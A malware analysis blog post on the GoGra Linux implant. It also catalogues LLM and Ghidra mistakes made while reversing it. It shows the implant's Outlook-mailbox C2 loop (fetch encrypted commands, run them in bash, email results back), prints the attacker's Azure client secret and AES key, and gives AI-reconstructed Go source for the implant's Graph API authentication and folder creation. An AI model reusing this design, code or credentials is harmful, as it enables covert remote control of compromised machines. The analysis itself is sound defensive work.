---
layout: post
title: "Linux/GoGra Payload Analysis"
author: cryptax
date: 2026-11-06
draft: false
tags:
- BlackAlps
- 44con
- 2026
- conference
- Go
- dropper
- Graph
- LLM
- pclntab
- strings

---

# GoGra Linux Payload analysis

This blog post continues our analysis of **GoGra Linux variant**. In a first part, we analyzed the [Dropper](/posts/gogra_dropper) and found out it was displaying a decoy PDF and executing another binary. In this second part, we analyze the other binary, also called **payload or implant**.

## Pclntab

The implant is stripped, so at first, Ghidra sees no function names, filenames etc.

![](/images/main-nofuncnames.png)

> Note that, at first, our LLM did not know at all how to deal with Go binaries. So, we pointed it to [this blog post](https://cujo.com/blog/reverse-engineering-go-binaries-with-ghidra/).

![](/images/gogun-creating-script.png)

Go binaries embed an interesting table, **PCLNTAB** (pc=program counter, ln=line number, tab=table), which is preserved in stripped binaries. The table is located in its own section, named `.gopclntab`, and it contains multiples things like source filenames, but more interesting function names. 

![](/images/pclntab.png)

The [header of the Pclntab](https://github.com/open-telemetry/opentelemetry-ebpf-profiler/blob/main/doc/gopclntab.md) begins with a *magic number*, `0xfffffff1` in our case (this is for Go version 1.20, actually our binary's precise version is 1.25.4 according to `go version -m main`).

```
struct runtime_pcHeader {
  uint32_t magic;            // See "Version" section.
  uint8_t pad[2];            // Zero.
  uint8_t minLC;             // Aka "quantum". Pointer alignment.
  uint8_t ptrSize;           // Pointer size: 4 or 8
  int64_t nfunc;             // Number of entries in the function table.
  unsigned nfiles;           // Number of entries in the file table.
  uintptr_t textStart;       // Base address for text section references.
  uintptr_t funcnameOffset;  // Offset to function name region.
  uintptr_t cuOffset;        // Offset to compilation unit table region.
  uintptr_t filetabOffset;   // Offset to file name region.
  uintptr_t pctabOffset;     // Offset to PC data region.
  uintptr_t pclnOffset;      // Offset to function data region.
};
```

We have `nfunc` entries of (fixed size) `struct runtime_functab` [info taken from here](https://github.com/open-telemetry/opentelemetry-ebpf-profiler/blob/main/doc/gopclntab.md):

```
struct runtime_functab {
  uint32_t pcOff;    // First byte of function code relative to textStart.
  uint32_t funcoff;  // Offset relative to the function tab start.
}
```

Each offset points to a `runtime._func` record:

```
struct runtime__func {
  uint32_t entryOff;    // First byte of function code relative to textStart.
  int32_t nameOff;      // Name of the function - relative to record.
  int32_t args;         // Number of arguments.
  ...
};
```

## Mapping function names to addresses

Based on Pclntab's format, we ask an LLM to create a **Ghidra script that will parse the tab and rename all functions**. The main parts of the script are written below. Basically, it finds the pclntab, then locates the function name, and renames each function. If the function is not created in Ghidra, it creates one with the correct name.


```java
public class GoFuncRename120 extends GhidraScript {
    ...
    @Override
    public void run() throws Exception {
        mem = currentProgram.getMemory();

        // Find .gopclntab
        MemoryBlock pclntabBlock = null;
        for (MemoryBlock block : mem.getBlocks()) {
            if (block.getName().equals(".gopclntab")) {
	    ...

        Address start = pclntabBlock.getStart();
	...
	renameFunctions118(start);
    }

    private void renameFunctions118(Address start) throws Exception {
        int ptrsize = mem.getByte(start.add(7)) & 0xFF;
        println("[*] ptrsize = " + ptrsize);

        long nfunctab, textStart, funcnametabOff, functabOff;
	...
	Function func = getFunctionAt(funcAddr);
        if (func != null) {
            String old = func.getName();
            func.setName(funcName, SourceType.USER_DEFINED);
            println("[+] " + old + " -> " + funcName);
            renamed++;
        } else {
            createFunction(funcAddr, funcName);
            println("[+] Created " + funcName + " @ 0x" + Long.toHexString(funcAddrVal));
            created++;
        }
	...
```

We run the script, it works perfectly:

![](/images/main-runscript.png)

```
+] FUN_08318030 -> crypto/internal/fips140/tls12.PRF[go.shape.interface{BlockSize()int;Reset();Size()int;Sum([]uint8)[]uint8;Write([]uint8)(int,error)}]
[+] FUN_08318150 -> crypto/internal/fips140/tls12.pHash[go.shape.interface{BlockSize()int;Reset();Size()int;Sum([]uint8)[]uint8;Write([]uint8)(int,error)}]
[+] FUN_08318390 -> crypto/internal/fips140/tls13.NewEarlySecret[go.shape.interface{BlockSize()int;Reset();Size()int;Sum([]uint8)[]uint8;Write([]uint8)(int,error)}]
[+] Created crypto/internal/fips140/tls13.NewEarlySecret[go.shape.interface{BlockSize()int;Reset();Size()int;Sum([]uint8)[]uint8;Write([]uint8)(int,error)}].func1 @ 0x83184c0
[+] Created go:textfipsend @ 0x8318520

[=] Done: renamed=3479  created=2805  errors=0
GoFuncRename120.java> Finished!
```

## Malicious Go package `OUTLOOKCLIENT`


Parsing the renamed function names, the following strike out as interesting:

```
[+] FUN_082841c0 -> OUTLOOKCLIENT/services.GetCompleteAuth
[+] FUN_08284320 -> OUTLOOKCLIENT/services.GetUser
[+] FUN_08284890 -> OUTLOOKCLIENT/services.GetUser.deferwrap1
[+] FUN_082848e0 -> OUTLOOKCLIENT/services.CreateFolder
[+] FUN_08284c90 -> OUTLOOKCLIENT/services.CreateFolder.deferwrap1
[+] FUN_08284ce0 -> OUTLOOKCLIENT/services.GetFolderId
[+] FUN_08285340 -> OUTLOOKCLIENT/services.EncryptString
[+] FUN_08285510 -> OUTLOOKCLIENT/services.addPKCS7Padding
[+] FUN_08285680 -> OUTLOOKCLIENT/services.DecryptString
[+] FUN_082858a0 -> OUTLOOKCLIENT/services.ExcuteCommand
[+] FUN_08285c00 -> OUTLOOKCLIENT/services.Auth
[+] FUN_08286260 -> OUTLOOKCLIENT/services.Auth.deferwrap1
[+] FUN_082862b0 -> OUTLOOKCLIENT/services.GetClientName
[+] FUN_08286300 -> OUTLOOKCLIENT/services.DeleteingMessage
[+] FUN_08286660 -> OUTLOOKCLIENT/services.ReadingMessages
[+] Created OUTLOOKCLIENT/services.ReadingMessages.deferwrap1 @ 0x8287050
[+] Created OUTLOOKCLIENT/services.ReadingMessages.func1 @ 0x82870a0
[+] FUN_082870e0 -> OUTLOOKCLIENT/services.SendingMessages
[+] FUN_082877f0 -> OUTLOOKCLIENT/services.SendingMessages.deferwrap1
[+] Created main.main @ 0x8287840
```

The malware implements a package named `OUTLOOKCLIENT`. The name is intentionally vague for stealthy reasons, but it is clearly related to the fact GoGra communicates to the C2 via an Outlook dead drop mailbox.

## A collection of AI or decompiler errors

I personally like to use a Ghidra MCP, along with OpenCode and a LLM, and ask it to clarify variable and functions names.

![Asking to rename functions, variables](/images/main-ghidra-decompile.png)

> The first reaction is often "wow, this is good". The second reaction is, by far, less positive. **While the global concepts are often "approximately" correct, when we go down to details, lots of things are absolutely wrong**. This is only the first step: we must still reverse on our own (understand this or that detail) or ask an LLM to clarify a detail (if possible use different LLMs).


### Error no.1 : decompiler "imprecision" on `getpid()`

![All variable names, comments are from AI](/images/main-ghidra-decompile-beginning.png)

**AI can be mistaken, but remember that decompilers too**. In this precise screenshot, the comment says "Generate pseudo-random PID for User Agent string via syscall_getpid()", but we see no syscall_getpid in the decompiled code.

**The solution comes from the assembly**: we have a call to `syscall.rawSyscallNoError` with 0x14: this actually resolves to `syscall.getpid`. So, actually, in this case, the decompiled code was incomplete, but AI's comment was correct.

### Error no. 2: bad assumption from AI on `GetClientName`

Below, the comments from AI say that `GetClientName()` returns "Linux".

```c
    /* Auth loop top
       GetClientName() returns "Linux" for the Graph API User-Agent */
    OUTLOOKCLIENT/services.GetClientName();
```

When we investigate, `GetClientName()` calls `os/user.Current()`: this is going to returns the current **username**, not *Linux*. If the call fails, the username will be replaced by "Unknown-System" (0x0838cca8). Maybe the LLM assumed the function would return "Linux" based on the error string "Unknown-System"? In reality, the binary call `os/user.Current()`, which calls `getuid()`, which calls getpwuid_r(), which parses `/etc/passwd` to get the username. The "Unknown-System" error comes from the inability to get the username that way if the system is "unknown".


### Error no. 3:  decompiler misses several assembly lines around `SendingMessages`

The main ends with a loop where it reads and processes incoming messages in `ReadingMessages`.

![](/images/main-ghidra-decompile-result.png)

With critical judgement, we can ask ourselves: why isn't the binary *sending* anything?

The answer is simple: **Ghidra's decompiler is wrong**. A function named `OUTLOOKCLIENT/services.SendingMessages` is called in the main. 

```
08287c67 89 44 24 1c     MOV        dword ptr [ESP + 0x1c]=>local_bc,EAX
     // Step D: SendingMessages() - POST encrypted result to Ou
    // // then sleep 2s, poll again
08287c6b e8 70 f4        CALL       OUTLOOKCLIENT/services.SendingMessages           [Command D] services.SendingMess
         ff ff
08287c70 c7 04 24        MOV        dword ptr [ESP]=>local_d8,0x77359400
         00 94 35 77
```

An entire portion is missing in the decompiled code. In reality, the loop:

1. Reads a message
2. Handles a few error cases like 204 (No Content), 404 (Unauthorized), 404 (Not Found)...
3. Decrypts the message
4. Executes the command
5. Encrypts the result
6. Sends it

### Error no. 4: decompiler doesn't use the correct ABI by default

In `OUTLOOKCLIENT/services.Auth` (0x08285c00), the code creates an HTTP request.
The decompiled code shows a call to `NewRequestWithContext`, with 2 arguments.

```c
net/http.NewRequestWithContext(&PTR_DAT_08407ab0,&DAT_085f60e0);
```

On Intel 80386, Go uses a **stack-based ABI**: all arguments and return values are on the stack. This confuses Ghidra, which is more used to register-based ABIs.

In reality, `NewRequestWithContext` (from the Golang http package) takes [4 arguments](https://pkg.go.dev/net/http#NewRequestWithContext):

```go
func NewRequestWithContext(ctx context.Context, method, url string, body io.Reader) (*Request, error)
```

![](/images/main-auth-newrequest.png)

The assembly shows the following data pushed on the stack

- ESP: PTR_DAT_08407ab0 will contain the context
- ESP+0x08: string "POST" - note the length of the string is 4 (ESP+0x0c)
- ESP+0x10: URL string https://login.microsoftonline.com/4c810586-3d32-4628-bea2-775ea805debe/oauth2/token, of length 0x53
- ESP+0x18: PTR_DAT_08406550 will contain the io.Reader

> The decompiler and AI are complementary. When one gets something wrong, the other can help clarify it.

### Error no.5: AI confuses a Go BuildId with a Graph API Bearer Token!

I like AI to prepare malware analysis reports for me. It helps me organize functionalities, and see where I need to dig in more. While LLMs globally do a great job, I can't stress enough that **anything can be wrong, and needs to be checked**.

![](/images/opencode-bearer-token.png)

So, the LLM claims that the malware contains a *hard-coded bearer token to authenticate to Graph API*. This is plausible... but it's **wrong**.

The malware performs OAuth 2.0 authentication in `Auth()` (see previous point), which returns an **access token**. This access token is then used as bearer token `Authorization: Bearer <access-token>` to get user id and create a folder, using the Graph API. **Why would the malware then need a hard-coded bearer token?**

The answer is very simple: it does not, and the `ESUHaHtfy9qTrnA7UphE/_PIBXisUTQYD4zLyrPsb/ilyda5jFOJizh7q8xn7J/KoitlGmw-g0SwLRqarxb` string is **not a bearer token at all but a Go Build Id** for the dropper.

![](/images/gobuild-id.png)

This can also be confirmed by go tools:

```
go tool buildid ./gogra.dropper.elf
ESUHaHtfy9qTrnA7UphE/_PIBXisUTQYD4zLyrPsb/ilyda5jFOJizh7q8xn7J/KoitlGmw-g0SwLRqarxb
```


### Error no. 6: decompiler mess for Go strings

As Go strings come with lengths, they are packed back-to-back in .rodata areas with no null terminators. For Ghidra, this is problematic because it can't find the string boundaries, so it merges all strings in a huge `char []` and labels it with the name of the first string it sees.

![](/images/main-ghidra-gostring.png)

The solution is to remove label and get the address instead.
In our case, the assembly (at 0x8285ce3)  is modified to `LEA ECX,[DAT_0838ae4a]`, and this address points to the string `resource`.

![](/images/main-ghidra-resource.png)

Precisely, we have a call to the Go runtime function `runtime.mapassign_faststr` with 4 arguments:

1. DAT_08345800: this is a pointer to the map type.
2. puVar5, which is actually formParams.
3. the string `resource`
4. the length of the string: 8 (correct indeed for `resource`).

> How do know all this? Either you already know about reversing Go binaries (the way Go strings are handled and functions ABI are quite typical of Go), and this is no mystery to you. Or you don't and either you search on the web ("old fashioned style"), or you ask the AI ("new lazy style").



## What the payload does

Once we have sorted out all errors of the decompiler and AI, we can work out what the main of the payload does.

1. It performs an **OAuth 2.0 Client Credentials Grant, to obtain an access token**. This consists in posting to the URL https://login.microsoftonline.com/4c810586-3d32-4628-bea2-775ea805debe/oauth2/token a form. Note that `4c810586-3d32-4628-bea2-775ea805debe` is the tenant Id, and that `client_id/client_secret` identify an *application* (not a user).

| Form Label | Value             |
| ---------- | ----------------- |
| resource | https://graph.microsoft.com |
| client_id | `d7441d26-ebfc-4c9a-b884-499642c04b05` |
| client_secret | `5XU8Q~N6fEcLi-D.Js.UBizL7nsXRfmWLZvwea2o` |
| grant_type | `client_credentials` |

2. It retrieves the userId for the user with display name "Zomato Pizza". This consists in a GET to https://graph.microsoft.com/beta/users with `Authorization: Bearer <accessToken>`, using the access token at step 1.

3. It creates an email folder `<username>-<pid>-Linux`. This actually posts to https://graph.microsoft.com/beta/users/<userId>/mailFolders with the email folder name as data. Then, it retrieves the folderId.

Then, it enters a **processing loop**:

1. Read messages from the mail folder. This performs a GET on `https://graph.microsoft.com/beta/users/<userId>/mailFolders/<folderId>/messages` with `Authorization: Bearer <accessToken>` and retrieves only messages with subject `Input`. After that, it immediately deletes the email.

2. It decrypts the body of the email. Precisely, it's Base64 decoding, then AES CBC decryption, with AES key `b14ca5898a4e4133bbce2ea2315a1916` and a zeroed IV.

3. It executes the decrypted command in a Bash shell. There are special cases to process commands such as `cd` and `pwd`.

4. It encrypts the result (same: AES CBC, PKCS7 padding, Base64).

5. It sends an email to `https://graph.microsoft.com/beta/users/<userId>/mailFolders/<folderId>/messages`  with Subject `Output`, and the encrypted body.

## Encryption / Decryption

Now that we have reversed the entire payload loop, it is quite clear that emails are AES-encrypted. But initially, we didn't have that much information.

The LLM quickly spotted the AES algorithm in the binary, and **guessed it was used for email encryption** within the Graph API.

![](/images/opencode-aes-guess.png)

But double-checking the fact, at this point, we had actually no proof this was true, because the LLM was unable to trace back the AES function to email encryption/decryption.

![](/images/opencode-admitting-guess.png)


> The LLM was having a hard time proving that email encryption/decryption was indeed happening. When a LLM loops, we, humans, have to either re-phrase our prompts or give it an idea how to *pivot*. This is what I did: I told it to find where the content of the email was being processed.

![](/images/opencode-pivot.png)

This unlocked the situation, and the LLM was able to spot that emails were decrypted in the main C2 loop: read message, decryption, process, send.

![](/images/opencode-aes-solution.png)

> Why didn't it figure it out by itself? This is Artificial Intelligence mystery. While AI can be quite smart and quick, it sometimes lacks simple intuition like this one, and stubbornly goes down the wrong path.



## Appendix A GoFuncRename120.java (for Go 1.20)

This script was generated by AI (but it works :D)

```java
// Recover function names in stripped Go binaries (Go 1.18 / 1.20+)
// Based on getCUJO ThreatIntel GoFuncRename120.py, rewritten as Java GhidraScript
//
// Magic 0xFFFFFFF0 = Go 1.18, 0xFFFFFFF1 = Go 1.20 (identical layout)
//
// Run from Ghidra: Script Manager -> GoFuncRename120.java -> Run
//
//@author  adapted from padorka@cujoai
//@category goscripts
//@keybinding
//@menupath
//@toolbar

import ghidra.app.script.GhidraScript;
import ghidra.program.model.address.Address;
import ghidra.program.model.listing.Function;
import ghidra.program.model.mem.Memory;
import ghidra.program.model.mem.MemoryBlock;
import ghidra.program.model.symbol.SourceType;

public class GoFuncRename120 extends GhidraScript {

    private Memory mem;

    private int readU32LE(Address base, long off) throws Exception {
        int b0 = mem.getByte(base.add(off)) & 0xFF;
        int b1 = mem.getByte(base.add(off + 1)) & 0xFF;
        int b2 = mem.getByte(base.add(off + 2)) & 0xFF;
        int b3 = mem.getByte(base.add(off + 3)) & 0xFF;
        return b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
    }

    private long readU64LE(Address base, long off) throws Exception {
        long lo = readU32LE(base, off) & 0xFFFFFFFFL;
        long hi = readU32LE(base, off + 4) & 0xFFFFFFFFL;
        return lo | (hi << 32);
    }

    private String readCString(Address addr) throws Exception {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 512; i++) {
            byte b = mem.getByte(addr.add(i));
            if (b == 0) break;
            sb.append((char)(b & 0xFF));
        }
        return sb.toString();
    }

    @Override
    public void run() throws Exception {
        mem = currentProgram.getMemory();

        // Find .gopclntab
        MemoryBlock pclntabBlock = null;
        for (MemoryBlock block : mem.getBlocks()) {
            if (block.getName().equals(".gopclntab")) {
                pclntabBlock = block;
                break;
            }
        }
        if (pclntabBlock == null) {
            println("[!] .gopclntab not found - aborting");
            return;
        }

        Address start = pclntabBlock.getStart();
        println("[*] .gopclntab at 0x" + Long.toHexString(start.getOffset()));

        // Check magic
        int magic = readU32LE(start, 0);
        println("[*] magic = 0x" + Integer.toHexString(magic & 0xFFFFFFFF));

        if (magic == 0xfffffff0 || magic == 0xfffffff1) {
            println("[*] Go 1.18/1.20 layout detected");
            renameFunctions118(start);
        } else if (magic == 0xfffffffa) {
            println("[!] Go 1.16 detected - layout not handled by this script");
        } else if (magic == 0xfffffffb) {
            println("[!] Go 1.2-1.15 detected - layout not handled by this script");
        } else {
            println("[!] Unknown magic 0x" + Integer.toHexString(magic) + " - attempting 1.18 layout");
            renameFunctions118(start);
        }
    }

    private void renameFunctions118(Address start) throws Exception {
        int ptrsize = mem.getByte(start.add(7)) & 0xFF;
        println("[*] ptrsize = " + ptrsize);

        long nfunctab, textStart, funcnametabOff, functabOff;
        if (ptrsize == 8) {
            nfunctab      = readU64LE(start, 8);
            textStart     = readU64LE(start, 8 + 2 * ptrsize);
            funcnametabOff = readU64LE(start, 8 + 3 * ptrsize);
            functabOff    = readU64LE(start, 8 + 7 * ptrsize);
        } else {
            nfunctab      = readU32LE(start, 8) & 0xFFFFFFFFL;
            textStart     = readU32LE(start, 8 + 2 * ptrsize) & 0xFFFFFFFFL;
            funcnametabOff = readU32LE(start, 8 + 3 * ptrsize) & 0xFFFFFFFFL;
            functabOff    = readU32LE(start, 8 + 7 * ptrsize) & 0xFFFFFFFFL;
        }

        println("[*] nfunctab    = " + nfunctab);
        println("[*] textStart   = 0x" + Long.toHexString(textStart));
        println("[*] funcnametab offset = 0x" + Long.toHexString(funcnametabOff));
        println("[*] functab     offset = 0x" + Long.toHexString(functabOff));

        Address funcnametab = start.add(funcnametabOff);
        Address functab     = start.add(functabOff);

        int renamed = 0, created = 0, errors = 0;
        int fieldSize = 4; // both fields are uint32 in Go 1.18+

        for (long i = 0; i < nfunctab; i++) {
            try {
                Address entry = functab.add(i * 2 * fieldSize);
                long pcOff       = readU32LE(entry, 0) & 0xFFFFFFFFL;
                long funcdataOff = readU32LE(entry, fieldSize) & 0xFFFFFFFFL;

                long funcAddrVal = textStart + pcOff;
                Address funcAddr = currentProgram.getAddressFactory()
                        .getDefaultAddressSpace().getAddress(funcAddrVal);

                // nameOff is at offset 4 in the _func struct (relative to functab base)
                long nameOff = readU32LE(functab.add(funcdataOff), fieldSize) & 0xFFFFFFFFL;
                Address nameAddr = funcnametab.add(nameOff);

                String funcName = readCString(nameAddr).trim().replace(" ", "");
                if (funcName.isEmpty()) continue;

                Function func = getFunctionAt(funcAddr);
                if (func != null) {
                    String old = func.getName();
                    func.setName(funcName, SourceType.USER_DEFINED);
                    println("[+] " + old + " -> " + funcName);
                    renamed++;
                } else {
                    createFunction(funcAddr, funcName);
                    println("[+] Created " + funcName + " @ 0x" + Long.toHexString(funcAddrVal));
                    created++;
                }
            } catch (Exception e) {
                errors++;
            }
        }

        println("\n[=] Done: renamed=" + renamed + "  created=" + created + "  errors=" + errors);
    }
}
```

## Appendix B: List of functions of the custom Go OUTLOOKCLIENT package

- `OUTLOOKCLIENT/services.GetCompleteAuth` - create folder, gets folder id
- `OUTLOOKCLIENT/services.GetUser` - get userid for Zomato Pizza
- `OUTLOOKCLIENT/services.CreateFolder` - create specific email folder for the bot
- `OUTLOOKCLIENT/services.GetFolderId` - locate folder
- `OUTLOOKCLIENT/services.EncryptString` - encrypt data
- `OUTLOOKCLIENT/services.DecryptString` - decrypt C2 commands
- `OUTLOOKCLIENT/services.addPKCS7Padding` - crypto helper
- `OUTLOOKCLIENT/services.ExcuteCommand` - shell execution
- `OUTLOOKCLIENT/services.DeleteingMessage` - delete C2 messages after reading
- `OUTLOOKCLIENT/services.ReadingMessages` - poll mailbox for commands
- `OUTLOOKCLIENT/services.SendingMessages` - exfiltrate output via email
- `OUTLOOKCLIENT/services.Auth` - authenticate to Graph API
- `OUTLOOKCLIENT/services.GetClientName` - get username
- `OUTLOOKCLIENT/services.checkInternetConnection` - connectivity check

## Appendix C: Key Functions

| Address | Name | Purpose |
|---|---|---|
| `0x08287840` | `main_c2_loop` | Main C2 polling loop: auth → read mail → decrypt → exec → reply |
| `0x08285680` | `decrypt_and_execute` | base64 → AES-256-CBC decrypt → PKCS7 strip → exec |
| `0x080a90d0` | `ExcuteCommand` | Execute decrypted shell command via bash |
| `0x082870e0` | `services.SendingMessages` | Send command output as email via Graph API |
| `0x08286660` | `services.ReadingMessages` | Poll Outlook mailbox folder for incoming commands |
| `0x08285340` | `services.EncryptString` | AES-256-CBC encrypt (zero IV), base64 out |
| `0x08296480` | `aes_cbc_encrypt_wrapper` | CBC encrypt wrapper |
| `0x08296570` | `aes_cbc_CryptBlocks_encrypt` | CBC block loop |
| `0x082950c0` | `aes_block_encrypt` | AES block encrypt (S-box at `0x085c9e00`) |
| `0x08295970` | `aes_block_decrypt` | AES block decrypt |
| `0x08294d10` | `aes_NewCipher` | Key size validation (0x10/0x18/0x20) |
| `0x08294db0` | `aes_NewCipher_keyExpand` | Key schedule; sets 10/12/14 rounds |
| `0x08284320` | `graph_http_request_builder` | Build Graph API HTTP POST with Bearer auth |
| `0x082848e0` | `graph_http_response_reader` | Read + check Graph API response (status 200) |
| `0x082841c0` | `graph_send_dispatcher` | Top-level send dispatcher (register/announce to C2) |

## Appendix D: Auth() function, as reconstructed by AI

```go
func Auth() (accessToken string, httpStatus int) {
	// Step 1: Build POST body as url.Values
	// Binary at 0x08285d38–0x08285f30: four runtime.mapassign_faststr
	// calls assign keys (resource, client_id, client_secret, grant_type)
	// to the formParams map.
	formParams := url.Values{}
	formParams.Set("resource", "https://graph.microsoft.com")
	formParams.Set("client_id", "d7441d26-ebfc-4c9a-b884-499642c04b05")
	formParams.Set("client_secret", "5XU8Q~N6fEcLi-D.Js.UBizL7nsXRfmWLZvwea2o")
	formParams.Set("grant_type", "client_credentials")

	// Step 2: Build HTTP request
	// Binary at 0x08285f46: ctx = context.Background() (global singleton
	// DAT_08407ab0 + type DAT_085f60e0).
	// "POST" at 0x0838a463 (len 4).
	// URL at 0x083a0d89 (83 bytes).
	tokenURL := "https://login.microsoftonline.com/" +
		"4c810586-3d32-4628-bea2-775ea805debe/oauth2/token"

	req, err := http.NewRequestWithContext(
		context.Background(),
		"POST",
		tokenURL,
		strings.NewReader(formParams.Encode()),
	)
	if err != nil {
		return "", 500
	}

	// Step 3: Set Content-Type header
	// Binary at 0x083957bc: "application/x-www-form-urlencoded"
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Step 4: Execute request
	// Binary at 0x0822a3c0: http.Client.Do wrapper.
	// Deferred cleanup via deferwrap1 (0x08286260) → resp.Body.Close().
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", 500
	}
	defer resp.Body.Close()

	// Step 5: Check HTTP status
	// Binary at 0x082860e0: CMP dword [resp+8], 200
	if resp.StatusCode != http.StatusOK {
		return "", resp.StatusCode
	}

	// Step 6: Read + parse JSON response
	// Binary at 0x08286105: io.ReadAll(resp.Body) → FUN_08103ab0
	// Binary at 0x08286142: json.Unmarshal(body, &tokenResult) → FUN_08265990
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", 500
	}

	var token tokenResponse
	if err := json.Unmarshal(body, &token); err != nil {
		return "", 500
	}

	// Return access token + success status
	// Binary stores token string in [ESP+0x8c]/[ESP+0x48] (return slots),
	// writes 200 to [ESP+0x4c].
	return token.AccessToken, http.StatusOK
}
```


## Appendix E: `CreateFolder` as reconstructed by AI

```go
func CreateFolder(accessToken string, userId string, folderName string) (folderId string, err error) {
	// Build URL
	// Binary at 0x08284956: runtime_concatstring3(...)
	//   part 1: &DAT_083985e3 = "https://graph.microsoft.com/beta/users/" (0x27)
	//   part 2: userId (param_3/4)
	//   part 3: &DAT_0838c170 = "/mailFolders" (0xc)
	url := fmt.Sprintf("https://graph.microsoft.com/beta/users/%s/mailFolders", userId)

	// Build request body
	// Binary at 0x08284907: runtime_convTstring(param_5, param_6) converts
	//   folderName string → interface{} for JSON marshaling.
	// Binary at 0x0828492b: encoding_json_Marshal(&DAT_08351160, ...)
	//   DAT_08351160 is the type descriptor for createFolderRequestBody.
	body := createFolderRequestBody{DisplayName: folderName}
	bodyBytes, err := json.Marshal(body)
	if err != nil {
		return "", err
	}

	// Build HTTP request
	// Binary at 0x08284990: net_http_NewRequestWithContext(...)
	//   context: context.Background()    (&PTR_DAT_08407ab0 + &DAT_085f60e0)
	//   method:  "POST"                  (&DAT_0838a463, len 4)
	req, err := http.NewRequest(
		"POST",
		url,
		strings.NewReader(string(bodyBytes)),
	)
	if err != nil {
		return "", err
	}

	// Set headers
	// Binary at 0x082849e4–0x08284a45: two mapassign_faststr calls
	//   DAT_0838c164 = "Content-Type" (0xc bytes)
	//   DAT_0838aaca = "Bearer " (7 bytes) — runtime_concatstring2 concatenates
	//     with accessToken (param_1/2)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+accessToken)

	// Execute request
	// Binary at 0x08284a6b: net_http___Client__do(uVar3, local_54)
	//   Deferred close via OUTLOOKCLIENT_services_CreateFolder_deferwrap1
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// Check HTTP status
	// Binary at 0x08284a87: *(*(puVar4 + 8) != 200) → error path
	if resp.StatusCode != http.StatusOK {
		errBody, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("CreateFolder: HTTP %d: %s", resp.StatusCode, string(errBody))
	}

	// Parse response
	// Binary reads response body and extracts folder ID from JSON.
	// Response: {"id": "folder_id", "displayName": "Zomato Pizza", ...}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	var result struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal(respBody, &result); err != nil {
		return "", err
	}

	return result.ID, nil
}
```
